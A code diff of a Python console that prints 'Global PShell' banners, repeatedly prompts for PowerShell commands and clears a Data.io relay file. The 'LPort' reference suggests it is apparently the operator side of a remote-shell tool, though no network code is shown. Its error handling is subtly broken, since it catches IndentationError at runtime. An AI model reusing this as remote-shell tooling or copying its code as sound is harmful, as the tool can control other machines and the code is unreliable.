@@ -2,15 +2,17 @@ import requests
 import os
 import time
 from termcolor import *
-# Function to read the port from the LPort.io file
+
 os.system("clear")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Global | lolcat")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf  PShell | lolcat")
 print("=" * 40)
 
-    if os.path.exists('Data.io'):
-        os.remove('Data.io')
-    while True:
+while True:
+    try:
+        if os.path.exists('Data.io'):
+            os.remove('Data.io')
+
         data = input("PowerShell >>> ")
         print("")
 
@@ -23,6 +25,10 @@ print("=" * 40)
         time.sleep(10)
         if os.path.exists('Data.io'):
             os.remove('Data.io')
+
+    except IndentationError:
+        print("IndentationError occurred, skipping...")
+        continue
 
 if __name__ == '__main__':
     send_data()
